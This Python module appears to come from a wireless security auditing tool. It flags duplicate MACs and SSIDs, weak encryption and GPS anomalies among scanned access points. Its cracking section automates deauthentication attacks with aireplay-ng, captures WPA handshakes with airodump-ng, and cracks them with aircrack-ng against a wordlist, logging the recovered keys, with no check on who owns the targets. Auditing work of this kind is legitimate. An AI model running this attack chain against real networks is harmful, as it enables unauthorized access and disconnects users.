import csv
import enum
import glob
import json
import os
import re
import subprocess
import threading
import time
import haversine
from datetime import datetime, timedelta

from config import get_config
from logger import get_logger

# Enum definitions for test types and results.


class TestType(enum.Enum):
    MAC = 1         # Test MAC address
    SSID = 2        # Test SSID
    ENCRYPTION = 3  # Test encryption
    GPS = 4         # Test GPS coordinates
    GPS_SSID = 5    # Test GPS coordinates grouped by SSID
    GPS_MAC = 6     # Test GPS coordinates grouped by MAC address
    CRACKING = 7    # Test encryption with cracking


class TestResult(enum.Enum):
    OK = "Test passed"
    SAME_MAC = "Device has the same MAC address as the: "
    SAME_SSID = "Device has the same SSID as the: "
    NO_ENCRYPTION = "Device has no encryption"
    WEP_ENCRYPTION = "Device has WEP encryption, which is insecure"
    WPA1_ENCRYPTION = "Device has WPA encryption, which is insecure"
    GPS_DISTANCE = "Device is too far apart from the: "
    NO_GPS = "Device has no GPS coordinates"
    ENC_CRACKED = "Device encryption has been cracked successfully."


# Global flag and variable to track test execution.
TESTING_RUNNING = False
CURRENT_TEST = None

# Global database variables (will be set by test() when database is initialized).
CONN = None
CURSOR = None

ALREADY_CRACKED_IDS = set()

CONFIG_INSTANCE = get_config()
CONFIG = CONFIG_INSTANCE.CONFIG

LOGGER = get_logger(*CONFIG_INSTANCE.get_logger_settings())

cracking_thread = None


def test(enable_cracking: bool, handshake_capture_time, cracking_type):
    """
    Initializes the database connection and starts the testing process.

    Parameters:
		enable_cracking (bool): Whether to enable cracking.
		handshake_capture_time (int): Time to wait while capturing handshakes (time in 'seconds').
    """
    global TESTING_RUNNING, CURRENT_TEST, CONN, CURSOR, cracking_thread
    TESTING_RUNNING = True
    CURRENT_TEST = None
    from db_handler import get_database_handler
    db_handler = get_database_handler()
    CONN = db_handler.get_conn()
    CURSOR = db_handler.get_cursor()
    test_all()
    if enable_cracking:
        test_cracking(handshake_capture_time, cracking_type)
    # if cracking_thread is None and enable_cracking:
    #     LOGGER.debug("Starting cracking thread.")
    #     cracking_thread = threading.Thread(target=test_cracking, args=(handshake_capture_time,), daemon=True)
    #     cracking_thread.start()
    #     cracking_thread.join()
    CURRENT_TEST = None
    TESTING_RUNNING = False


def log_unique_test(device_id, test_type, test_result, other_device_id=None):
    """
    Logs a test record for unique test results only once per device.

    Parameters:
        device_id (int): ID of the device to log the test for.
        test_type (str): Type of the test.
        test_result (str): Result of the test.
        other_device_id (int): ID of the device the test was performed with.
    """
    if CONN is None or CURSOR is None:
        LOGGER.error("Database not initialized for MAC testing.")
        return
    if other_device_id is None:
        query = "SELECT ID FROM tests WHERE device_id = ? AND test_type = ? AND test_result = ? AND tested_with_device_id IS NULL"
        CURSOR.execute(query, (device_id, test_type, test_result))
    else:
        query = "SELECT ID FROM tests WHERE device_id = ? AND test_type = ? AND test_result = ? AND tested_with_device_id = ?"
        CURSOR.execute(query, (device_id, test_type, test_result, other_device_id))
    if CURSOR.fetchone():
        return
    # Log the test.
    query = "INSERT INTO tests (device_id, test_type, test_result, tested_with_device_id) VALUES (?, ?, ?, ?)"
    CURSOR.execute(query, (device_id, test_type, test_result, other_device_id))

def log_cracked_password(device_id, password):
    """
    Logs a cracked password for a device.

    Parameters:
        device_id (int): ID of the device with the cracked password.
        password (str): The cracked password.
    """
    if CONN is None or CURSOR is None:
        LOGGER.error("Database not initialized for logging cracked passwords.")
        return
    query = "INSERT INTO cracked_passwords (device_id, password) VALUES (?, ?)"
    CURSOR.execute(query, (device_id, password))
    CONN.commit()


def test_cracking(handshake_capture_time: int, cracking_type: str):
    """
    Tests WPA/WPA2 handshake capture and password cracking.

    Parameters:
        handshake_capture_time (int): Time to wait while capturing handshakes (time in 'seconds').
    """
    global cracking_thread, CONN, CURSOR
    try:
        LOGGER.info("Starting cracking password.")
        test_wpa_handshake_capture(
            cracking_type, handshake_capture_time, CONN, CURSOR)
        time.sleep(1)
        cracking_thread = None
    except Exception as e:
        LOGGER.error(f"Error during cracking password: {e}")
        LOGGER.exception(f"{e}")

def test_all():
    """
    Runs all tests.
    A small sleep is used to allow the database to settle before running the next test.
    """
    try:
        LOGGER.info("Starting MAC test.")
        test_mac()
        time.sleep(1)
    except Exception as e:
        LOGGER.error(f"Error during MAC test: {e}")
        LOGGER.exception(f"{e}")

    try:
        LOGGER.info("Starting SSID test.")
        test_ssid()
        time.sleep(1)
    except Exception as e:
        LOGGER.error(f"Error during SSID test: {e}")
        LOGGER.exception(f"{e}")

    try:
        LOGGER.info("Starting Encryption test.")
        test_encryption()
        time.sleep(1)
    except Exception as e:
        LOGGER.error(f"Error during Encryption test: {e}")
        LOGGER.exception(f"{e}")

    try:
        LOGGER.info("Starting GPS test.")
        test_gps()
        time.sleep(1)
    except Exception as e:
        LOGGER.error(f"Error during GPS test: {e}")
        LOGGER.exception(f"{e}")

    LOGGER.info("Testing finished.")
    if CONN is None:
        LOGGER.error("Database not initialized for testing.")
        return
    CONN.commit()
    LOGGER.debug("Tests committed to database.")


def stop_testing():
    global TESTING_RUNNING
    TESTING_RUNNING = False


def get_testing_status():
    global TESTING_RUNNING, CURRENT_TEST
    return TESTING_RUNNING, CURRENT_TEST


def test_mac():
    """
    Tests whether two or more devices have the same MAC address.
    Logs a test record for duplicate MAC addresses only once per device.
    """
    global CURRENT_TEST
    CURRENT_TEST = TestType.MAC.value
    if CURSOR is None:
        LOGGER.error("Database not initialized for MAC testing.")
        return

    # Query devices for duplicate MAC addresses.
    query = "SELECT ID, mac_address FROM devices WHERE mac_address IN (SELECT mac_address FROM devices GROUP BY mac_address HAVING COUNT(*) > 1);"
    CURSOR.execute(query)
    duplicates = CURSOR.fetchall()
    if not duplicates:
        return

    for duplicate in duplicates:
        device_id = duplicate[0]
        mac_address = duplicate[1]
        # get all devices with the same mac address
        query = "SELECT ID FROM devices WHERE mac_address = ? AND ID != ?"
        CURSOR.execute(query, (mac_address, device_id))
        device_records = CURSOR.fetchall()
        if len(device_records) > 1:
            for record in device_records:
                other_device_id, _ = record
                log_unique_test(
                    device_id,
                    TestType.MAC.name,
                    TestResult.SAME_MAC.name,
                    other_device_id
                )


def test_ssid():
    """
    Tests whether devices share the same SSID but have different MAC addresses.
    """
    global CURRENT_TEST
    CURRENT_TEST = TestType.SSID.value
    if CURSOR is None:
        LOGGER.error("Database not initialized for SSID testing.")
        return

    # Query devices for duplicate SSIDs.
    query = "SELECT ID, ssid FROM devices WHERE ssid IN (SELECT ssid FROM devices GROUP BY ssid HAVING COUNT(*) > 1);"
    CURSOR.execute(query)
    duplicates = CURSOR.fetchall()
    if not duplicates:
        return

    for duplicate in duplicates:
        device_id = duplicate[0]
        ssid = duplicate[1]
        # get all devices with the same ssid
        query = "SELECT ID FROM devices WHERE ssid = ? AND ID != ?"
        CURSOR.execute(query, (ssid, device_id))
        device_records = CURSOR.fetchall()
        if len(device_records) > 1:
            for record in device_records:
                other_device_id = record[0]
                log_unique_test(
                    device_id,
                    TestType.SSID.name,
                    TestResult.SAME_SSID.name,
                    other_device_id
                )


def test_encryption():
    """
    Tests each device's encryption.
    Logs a test record if encryption is missing or insecure,
    ensuring each test is logged only once per device.
    """
    global CURRENT_TEST
    CURRENT_TEST = TestType.ENCRYPTION.value
    if CURSOR is None:
        LOGGER.error("Database not initialized for encryption testing.")
        return

    # Query devices for missing or insecure encryption.
    query = "SELECT ID, encryption FROM devices WHERE encryption = '' OR encryption = 'Open' OR encryption LIKE '%WEP%' OR encryption LIKE '%WPA1%';"
    CURSOR.execute(query)
    devices = CURSOR.fetchall()
    for device in devices:
        device_id = device[0]
        encryption = device[1]
        if not encryption:
            log_unique_test(
                device_id,
                TestType.ENCRYPTION.name,
                TestResult.NO_ENCRYPTION.name
            )
        elif "Open" in encryption:
            log_unique_test(
                device_id,
                TestType.ENCRYPTION.name,
                TestResult.NO_ENCRYPTION.name
            )
        elif "WEP" in encryption:
            log_unique_test(
                device_id,
                TestType.ENCRYPTION.name,
                TestResult.WEP_ENCRYPTION.name
            )
        elif "WPA1" in encryption:
            log_unique_test(
                device_id,
                TestType.ENCRYPTION.name,
                TestResult.WPA1_ENCRYPTION.name
            )


def test_gps():
    """
    Tests whether each device has valid GPS coordinates.
    (Not implemented yet, but here you would add similar unique logging if needed.)
    """
    global CURRENT_TEST
    CURRENT_TEST = TestType.GPS.value
    if CURSOR is None:
        LOGGER.error("Database not initialized for GPS testing.")
        return

    CURSOR.execute("SELECT ID, lat_avg, lon_avg FROM devices")
    devices = CURSOR.fetchall()
    for device in devices:
        device_id, gps_lat, gps_lon = device
        # Log if GPS coordinates are missing.
        if not gps_lat or not gps_lon:
            log_unique_test(
                device_id,
                TestType.GPS.name,
                TestResult.NO_GPS.name
            )
        else:
            perform_gps_test(TestType.GPS_MAC, "mac_address")
            perform_gps_test(TestType.GPS_SSID, "ssid")


def perform_gps_test(test_type: TestType, group_by: str):
    if CURSOR is None:
        LOGGER.error("Database not initialized for GPS testing.")
        return
    # SELECT * FROM devices WHERE group_by IN (SELECT group_by FROM devices GROUP BY group_by HAVING COUNT(*) > 1);
    query = f"SELECT {group_by}, lat_avg, lon_avg FROM devices WHERE {group_by} IN (SELECT {group_by} FROM devices GROUP BY {group_by} HAVING COUNT(*) > 1)"
    CURSOR.execute(query)
    devices = CURSOR.fetchall()
    for device in devices:
        device_id, gps_lat, gps_lon = device
        # Log if GPS coordinates are missing.
        if not gps_lat or not gps_lon:
            continue
        # Get all devices with the same group_by value.
        query = f"SELECT ID, lat_avg, lon_avg FROM devices WHERE {group_by} = ? AND ID != ?"
        CURSOR.execute(query, (device_id, device_id))
        device_records = CURSOR.fetchall()
        if len(device_records) > 1:
            for record in device_records:
                other_device_id, other_gps_lat, other_gps_lon = record
                if test_gps_distance((gps_lat, gps_lon), (other_gps_lat, other_gps_lon)):
                    log_unique_test(
                        device_id,
                        test_type.name,
                        TestResult.GPS_DISTANCE.name,
                        other_device_id
                    )


def test_gps_distance(gps_a: tuple, gps_b: tuple):
    gps_a_lat = gps_a[0]
    gps_a_lon = gps_a[1]
    gps_b_lat = gps_b[0]
    gps_b_lon = gps_b[1]
    max_acceptable_dist = CONFIG["max_ap_distance"]
    dist = find_difference(gps_a_lat, gps_a_lon, gps_b_lat, gps_b_lon)

    if dist > max_acceptable_dist:
        return True
    return False


def find_difference(lat1, lon1, lat2, lon2):
    return haversine.haversine((lat1, lon1), (lat2, lon2), unit=haversine.Unit.METERS)


def test_wpa_handshake_capture(cracking_type, handshake_capture_time, conn, cursor):
    """
    Find all WPA/WPA2 devices (excluding WPA3, WEP, or Open),
    attempt to capture handshake for up to handshake_capture_time minute, then crack with aircrack-ng
    using only 2 CPU core. Skip if it's already been tried or if handshake not found.
    """
    global ALREADY_CRACKED_IDS, CURRENT_TEST
    CURRENT_TEST = TestType.CRACKING.value

    # Skip WEP, WPA3, and Open networks.
    query = """
        SELECT ID, ssid, mac_address, encryption, ssid_channels 
        FROM devices 
        WHERE encryption LIKE '%WPA%' 
          AND encryption NOT LIKE '%WEP%' 
          AND encryption NOT LIKE '%WPA3%' 
          AND encryption NOT LIKE '%Open%'
    """
    cursor.execute(query)
    wpa_devices = cursor.fetchall()
    if not wpa_devices:
        LOGGER.info("No WPA/WPA2 devices to crack.")
        return

    # We need the interface for cracking from the config
    cracking_interface = CONFIG['interface']['cracking']
    if not cracking_interface:
        LOGGER.error(
            "No cracking interface set in config. Aborting WPA handshake capture.")
        return

    monitor_interface = set_monitor_mode(cracking_interface)
    if not monitor_interface:
        LOGGER.error(
            f"Could not set monitor mode on {cracking_interface}. Aborting.")
        return

    for device_row in wpa_devices:
        device_id, ssid, bssid, encryption, ssid_channels = device_row
        if device_id in ALREADY_CRACKED_IDS:
            continue  # Already attempted
        ALREADY_CRACKED_IDS.add(device_id)  # Mark so we don't attempt again

        LOGGER.info(
            f"Attempting WPA handshake capture: Device ID {device_id} (BSSID {bssid}, SSID {ssid}).")

        channels = None
        if ssid_channels:
            line = json.loads(ssid_channels)
            line.sort()
            channels = ", ".join(line)
            LOGGER.debug(f"Channels for {ssid} is {channels}.")
        
        capture_handshake_with_deauth(cracking_type, monitor_interface, device_id, bssid,
                                      ssid, channel=channels, capture_timeout=handshake_capture_time)


def get_latest_targetcap(prefix, suffix):
    # Create a regex pattern that matches files like prefix-<number>.suffix exactly.
    regex = re.compile(rf"^{re.escape(prefix)}-\d+\.{suffix}$")
    files = [f for f in glob.glob(f"{prefix}-*.{suffix}") if regex.match(f)]
    if files:
        LOGGER.debug(f"Found {len(files)} files matching {prefix}-*.{suffix}.")
        return max(files, key=os.path.getmtime)
    LOGGER.debug(f"No files found matching {prefix}-*.{suffix}.")
    return None


def capture_handshake_with_deauth(cracking_type, monitor_iface, device_id, bssid, ssid, capture_timeout=60, channel=None):
    """
    Capture WPA/WPA2 handshake using airodump-ng and deauth attack.
    This function runs airodump-ng in the background and waits for a handshake to be captured.
    It also performs deauth attacks on clients to force them to reconnect.

    Parameters:
        monitor_iface (str): The monitor interface to use for capturing packets.
        device_id (int): The ID of the device being tested.
        bssid (str): The BSSID of the target access point.
        ssid (str): The SSID of the target access point.
        capture_timeout (int): The maximum time to wait for a handshake (in seconds).
        channel (int): The channel to use for airodump-ng (optional).
      
    Returns:
        The cracked key as a string if found; otherwise, returns None.
    """
    global TESTING_RUNNING
    TESTING_RUNNING = True

    cap_dir = "/tmp/audit/"
    bssid_clean = bssid.replace(":", "").upper()
    cap_prefix = os.path.join(cap_dir, f"capture-{bssid_clean}")
    LOGGER.debug(f"Capture prefix: {cap_prefix}")
    if not os.path.exists(cap_dir):
        try:
            os.makedirs(cap_dir)
            LOGGER.info(f"Created directory {cap_dir} for capture files.")
        except Exception as e:
            LOGGER.error(f"Failed to create directory {cap_dir}: {e}")
            return None

    # Build the airodump-ng command; include channel if provided.
    airodump_cmd = ["airodump-ng"]
    if channel is not None:
        airodump_cmd += ["--channel", str(channel)]
    airodump_cmd += ["--bssid", bssid, "-w", cap_prefix, monitor_iface]
    LOGGER.info(f"Starting airodump-ng with command: {' '.join(airodump_cmd)}")
    try:
        airodump_proc = subprocess.Popen(
            airodump_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True)
    except Exception as e:
        LOGGER.error(f"Failed to start airodump-ng: {e}")
        return None
    time.sleep(2)
    handshake_captured = False
    start_time = datetime.now()

    global crack_stop_event
    try:
        crack_stop_event # type: ignore
    except NameError:
        crack_stop_event = threading.Event()
    crack_stop_event.clear() # type: ignore

    def deauth_loop():
        csv_file = get_latest_targetcap(cap_prefix, "csv")
        LOGGER.debug(f"Deauth loop: CSV file = {csv_file}")
        time.sleep(2)
        while not crack_stop_event.is_set() and not handshake_captured:
            if not TESTING_RUNNING:
                break
            if csv_file is None or not os.path.exists(csv_file):
                LOGGER.debug(
                    "Deauth loop: CSV file not found; waiting for it to be created.")
                time.sleep(2)
                continue
            clients = []
            try:
                with open(csv_file, "r") as f:
                    reader = csv.reader(f)
                    in_client_section = False
                    for row in reader:
                        if "Station MAC" in row:
                            in_client_section = True
                        if in_client_section and len(row) >= 1:
                            client_mac = row[0].strip()
                            if len(client_mac) == 17 and ":" in client_mac:
                                clients.append(client_mac)
                if clients:
                    for client in clients:
                        LOGGER.info(
                            f"Deauth: Issuing deauth attack to client {client} for BSSID {bssid}.")
                        client_cmd = ["aireplay-ng", "-0", "2",
                                      "-a", bssid, "-c", client, monitor_iface]
                        try:
                            subprocess.run(
                                client_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=10)
                        except Exception as e:
                            LOGGER.error(
                                f"Deauth error for client {client}: {e}")
                        time.sleep(0.5)
                else:
                    LOGGER.info(
                        "Deauth: No clients found, issuing broadcast deauth attack.")
                    broadcast_cmd = ["aireplay-ng", "-0", "2", "-a", bssid, monitor_iface]
                    try:
                        subprocess.run(
                            broadcast_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=10)
                    except Exception as e:
                        LOGGER.error(f"Broadcast deauth error: {e}")
            except Exception as e:
                LOGGER.error(f"Error in deauth loop while reading CSV: {e}")
                break
            for _ in range(10):
                if crack_stop_event.is_set():
                    break
                time.sleep(1)

    deauth_thread = threading.Thread(target=deauth_loop, daemon=True)
    deauth_thread.start()

    LOGGER.info(f"Waiting for 4-way handshake (timeout = {capture_timeout} seconds)...")
    while (datetime.now() - start_time) < timedelta(seconds=capture_timeout) and not crack_stop_event.is_set(): # type: ignore
        if not TESTING_RUNNING:
            break
        try:
            LOGGER.debug("Reading airodump-ng output...")
            if airodump_proc.poll() is not None:
                LOGGER.error("airodump-ng process terminated unexpectedly.")
                break
            stdout_chunk = ""
            for i in range(10):
                stdout_chunk += airodump_proc.stdout.readline() # type: ignore
            if "wpa handshake:" in stdout_chunk.lower():
                handshake_captured = True
                LOGGER.info("Handshake captured!")
                break
            time.sleep(1)
        except Exception as e:
            LOGGER.error(f"Error reading airodump-ng output: {e}")
            break
    else:
        if not handshake_captured:
            LOGGER.debug("Timeout reached without capturing handshake.")
            crack_stop_event.set() # type: ignore

    try:
        airodump_proc.terminate()
        try:
            airodump_proc.wait(timeout=15)
        except subprocess.TimeoutExpired:
            LOGGER.info(
                "airodump-ng did not terminate gracefully; killing process.")
            airodump_proc.kill()
    except Exception as e:
        LOGGER.error(f"Error terminating airodump-ng: {e}")

    crack_stop_event.set() # type: ignore
    deauth_thread.join(timeout=5)

    if not handshake_captured:
        LOGGER.info("Cracking process aborted: no handshake captured.")
        return None

    cap_file = get_latest_targetcap(cap_prefix, "cap")
    LOGGER.debug(f"Capture file determined: {cap_file}")
    if not cap_file or not os.path.exists(cap_file):
        LOGGER.info("No capture file found after handshake capture.")
        return None
    
    run_aircrack(device_id, bssid, cap_file, cracking_type)

    # # Run run_aircrack on another thread to avoid blocking the main thread
    # # and to allow for graceful termination if needed.
    # aircrack_thread = threading.Thread(target=run_aircrack, args=(device_id, bssid, cap_file,), daemon=True)
    # aircrack_thread.start()
    # aircrack_thread.join()
    

def run_aircrack(device_id, bssid, dot_cap_file, cracking_type):
    """
    Run aircrack-ng on the given capture file and return the cracked key.

    Parameters:
        bssid (str): The BSSID of the target access point.
        dot_cap_file (str): The path to the capture file.

    Returns:
        str: The cracked key if found; otherwise, None.
    """
    aircrack_cmd = [
        "aircrack-ng", "-a2", "-b", bssid]
    if cracking_type == "rockyoutxt":
        aircrack_cmd += [
            "-w", "/usr/share/wordlists/rockyou.txt", dot_cap_file]
    elif cracking_type == "customPasswordList":
        aircrack_cmd += [
            "-w", "./config/customPasswordList.txt", dot_cap_file]
    LOGGER.info(
        f"Running aircrack-ng with command: {' '.join(aircrack_cmd)}")
    try:
        result = subprocess.run(
            aircrack_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
        if result.returncode == 0:
            LOGGER.info("Aircrack-ng reported successful cracking!")
            key_match = re.search(r"KEY FOUND! \[(.*?)\]", result.stdout)
            if key_match:
                key = key_match.group(1)                
                LOGGER.info(f"Cracking successful for device {bssid}! Key: {key}")
                try:
                    with open("/var/log/cracked_ap_keys.txt", "a") as f:
                        f.write(f"({bssid}): {key}\n")
                except Exception as e:
                    pass

                log_unique_test(device_id, TestType.CRACKING.name,
                                    TestResult.ENC_CRACKED.name)
                log_cracked_password(device_id, key)
            else:
                LOGGER.info(f"Cracking attempt failed (or no key found) for device {device_id}.")
        else:
            LOGGER.info("Aircrack-ng failed to crack the handshake.")
            return None
    except Exception as e:
        LOGGER.error(f"Exception while running aircrack-ng: {e}")
        return None


def set_monitor_mode(interface):
    """
    Sets the given interface into monitor mode using airmon-ng
    and returns the new monitor interface name (e.g. wlan2mon).
    """
    LOGGER.info(f"Enabling monitor mode on {interface}...")
    try:
        proc = subprocess.Popen(["airmon-ng", "start", interface],
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                universal_newlines=True)
        stdout, _ = proc.communicate(timeout=10)
        if interface.endswith("mon"):
            return interface
        else:
            return interface + "mon"
    except Exception as e:
        LOGGER.error(f"Failed to set monitor mode on {interface}: {e}")
        return None
